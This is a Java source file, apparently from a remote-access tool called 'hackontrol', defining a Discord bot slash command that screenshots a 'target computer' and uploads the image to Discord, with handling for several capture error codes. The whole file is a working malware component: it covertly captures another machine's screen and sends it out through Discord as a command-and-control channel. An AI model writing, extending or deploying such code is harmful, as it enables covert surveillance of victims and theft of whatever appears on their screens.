package com.khopan.hackontrol.command.popcorn;

import com.khopan.hackontrol.command.PopcornCommand;
import com.khopan.hackontrol.function.Screenshot;

import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.interactions.commands.build.Commands;
import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
import net.dv8tion.jda.api.utils.FileUpload;

public class ScreenshotCommand implements PopcornCommand {
	@Override
	public SlashCommandData getCommand() {
		return Commands.slash("screenshot", "Screenshot the target computer")
				.setGuildOnly(false);
	}

	@Override
	public void handleCommand(SlashCommandInteractionEvent Event) {
		byte[] screenshot = Screenshot.take();

		if(screenshot == null || screenshot.length == 0) {
			Event.reply("`Failed to take screenshot`").queue();
			return;
		}

		if(screenshot.length != 1) {
			Event.replyFiles(FileUpload.fromData(screenshot, "screenshot.png")).queue();
			return;
		}

		byte exitCode = screenshot[0];

		if(exitCode == 1 || exitCode == 4) {
			Event.reply("`Error: Not enough memory`").queue();
			return;
		} else if(exitCode == 2) {
			Event.reply("`Internal Error: GetDIBits() function error`").queue();
			return;
		} else if(exitCode == 3) {
			Event.reply("`Error: PNG compression error`").queue();
			return;
		}

		Event.reply("`Screenshot failed and exited with code: " + exitCode + "`").queue();
	}
}
